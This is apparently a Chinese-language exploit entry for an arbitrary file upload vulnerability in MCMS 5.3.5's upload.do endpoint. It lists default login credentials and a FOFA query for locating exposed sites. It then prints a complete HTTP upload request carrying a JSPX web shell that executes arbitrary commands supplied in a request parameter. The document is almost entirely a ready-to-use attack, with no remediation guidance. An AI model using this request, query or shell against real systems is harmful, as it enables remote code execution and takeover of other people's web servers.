## 铭飞MCMS接口upload.do存在任意文件上传漏洞

MCMS 5.3.5 存在允许在某些页面上传任意文件的漏洞。由于缺乏对文件扩展名的严格过滤，攻击者可以利用后端上传点上传任意文件。

默认凭据“msopen/msopen”可用于登录。

## fofa

```
body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
```

## poc

```yaml
POST /ms/file/upload.do HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 1519
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv6padqmOBvzQrGNY
Accept: */*
Origin: http://127.0.0.1:8000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8000/ms/basic/app/app.do?
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pageno_cookie=1; JSESSIONID=B74AEB30E5118633728E8C63A8023F89; SHIRO_SESSION_ID=d9448adc-22d7-4095-aaf0-cdfc665ccc5b; rememberMe=FfWkNMTRTmfv1PftgMqyQaHPMttkHQFgN4hrBdSBgY+SBj+GBtgVfmt4hT6Wp8eJ96WEBXqu4QzVPA7bvZ0Ft8uYwiqLu/Wd04wBn2q+N2tUK03q6Jj2HKH6J5uksbNYz+6JDZ7Jjjc3eHQEvjZPDL5UO4onrpP+GKeIqAl4BFGeDcLhzmmp7FoskPySoN8YqQhrRETw+FxgYy4U+G9ZK7Kz4cjL5s1lyRPkJvHVolp92X7X6po2s8JQCUUgZKYqvcYgFfsJL1OMteOslPAnzCZ4T25yjPvVI+vTk65+8T6NfSgMsVc/MS0yQRbBNQIDTuqD6z5aaMbMbUcYNIrBp25aa43yNuyPXw8hrV+sdZwNGSYmkuuGd54cZTGopcGJ7/ITRlWhp6N0MHA6rkHAO0YDxZ4ZKQdnvRy+tLzQ0Zihmb3EBp0akH1BHb2m4zJ44sGsfriB5p1zyIWzqrA9RzlaHHgy8CJ9uagYZ85FBOxuf0Vgb9e+cD9Uc6HpxMZF43tgwUEJ4D9gY9NyDOxSbbvxBcry4FikPzy4QmMGrTdD2fx7Y6nOTFFhcoEZ+aNjfYRXJdnKPD7vxlSZwzouiNZZR4R3fbeHu2g1+hprtYPxWOs4dzp13NGgEqpy6gzBcwzhth9qFz3SigaXTcJI/W4I765krHUFipNRDF7oGB6EY6gHRXabdQMTTOPgHCnHssQZ80s1jtJfrJFSLvTutE0GOtrLG4TxNiKNF/c+BMIlIF+foFrPWSD1EfvvWj7uzdIX9NvUEaI+GYUOPjrND+0Vw3aNRn0Za4lMf/HQ1VPX0eUI0nNPMsr6DKN69HaYje8iVkSlKkR3oqqlJpCmbI53BWW2PdNLUsGYy7T9PSpMHYe1gaoPQTEPFO7XdSzx7bsZwzvOZ0yjpkU76DTSgPEswlrRiAlN70W4/eDCNe9llsQoMkmN2BRE4Cvh37vQ8zBBUQvnosPZB0svn2i/UMhZEWIELmbFAhQ7F4uh4rVo0zpEDpY0kB9gv4f/HIHJIX7N2gedp2bbK1tVBeJ2cvUNPRcVdrjpK0F/KOZCPwBihRngv7fcuVmcCCddd9crYWXeiw7xOmIYH/Lvu5/cYPcNCz6I22L9WgxUzMZ1LSE2iVKKUADSmJ/EiL7UiApSReAZQPpkIMZHxMvCVXb0Xh9QegeJiCFY3F9W+FGdTMiBJeQa9zXw+ocSvgLcLirR4pBc3pJgnwpg9o3kRk2a0nmZ7w187CwsDswdLnt0ddN/2Yrni9R3kArSgvM/Q7yS/nO3JmUDiqehKep8IxkJlR+8KYFobspGMr+YLPom0ut7h/Stf5FvYxYbGNXNmGVuC+jBsODMNpHE5mQ=
Connection: close

------WebKitFormBoundaryv6padqmOBvzQrGNY
Content-Disposition: form-data; name="uploadPath"

html/web
------WebKitFormBoundaryv6padqmOBvzQrGNY
Content-Disposition: form-data; name="rename"

false
------WebKitFormBoundaryv6padqmOBvzQrGNY
Content-Disposition: form-data; name="appId"

false
------WebKitFormBoundaryv6padqmOBvzQrGNY
Content-Disposition: form-data; name="uploadFolderPath"

true
------WebKitFormBoundaryv6padqmOBvzQrGNY
Content-Disposition: form-data; name="file"; filename="1.jspx."
Content-Type: text/plain

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
          xmlns="http://www.w3.org/1999/xhtml"
          xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2">
    <jsp:directive.page contentType="text/html" pageEncoding="gb2312"/>
    <jsp:directive.page import="java.io.*"/>
 
    <html>
        <head>
            <title>jspx</title>
        </head>
        <body>
            <jsp:scriptlet>
               try {
		String cmd = request.getParameter("paxmac");
		if (cmd !=null){
			Process child = Runtime.getRuntime().exec(cmd);
			InputStream in = child.getInputStream();
			int c;
			while ((c = in.read()) != -1) {
			out.print((char)c);
			}
			in.close();
			try {
			child.waitFor();
			} catch (InterruptedException e) {
			e.printStackTrace();
		}
		}
		} catch (IOException e) {
		System.err.println(e);
		}
            </jsp:scriptlet>
        </body>
    </html>
</jsp:root>
------WebKitFormBoundaryv6padqmOBvzQrGNY--
```

